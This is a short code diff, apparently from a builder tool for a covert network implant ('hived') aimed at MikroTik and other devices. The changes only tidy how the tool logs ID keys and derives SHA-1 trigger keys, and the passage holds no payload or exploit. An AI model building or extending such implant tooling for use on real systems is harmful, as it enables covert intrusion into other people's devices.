@@ -44,7 +44,7 @@
 #define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
 
 #define ID_KEY_FILE	"ID-keys.txt"
-#define ID_KEY_DATETIME_FORMAT	"%4i/%2i/%2i %02i:%2i:%2i"
+#define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
 
 #define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH
 
@@ -261,10 +261,11 @@ int main(int argc, char **argv)
 
 				currentTime = time(NULL);
 				idKeyTime = gmtime(&currentTime);
-				fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",
-					idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday, idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);	// Record the ID key time and text
 
-				if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text in the file is of sufficient length
+				if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 	// Validate that the key text in the file is of sufficient length
+					fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\tFILE: %s",	// Record the ID key time and text
+					idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
+					idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
 					sha1_file((const char *)optarg, triggerKey);		// Generate the trigger key from the key file
 					D(printSha1Hash (stdout, "Trigger Key", triggerKey));
 
@@ -305,8 +306,9 @@ int main(int argc, char **argv)
 
 			currentTime = time(NULL);
 			idKeyTime = gmtime(&currentTime);
-			fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",
-				idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday, idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);	// Record the ID key time and text
+			fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",			// Record the ID key time and text
+				idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
+				idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
 			D(printf("\n\n\n DEBUG: keyPhrase=%s \n", optarg));
 
 			sha1((const unsigned char *) optarg, strlen(optarg), triggerKey);	// Compute trigger key
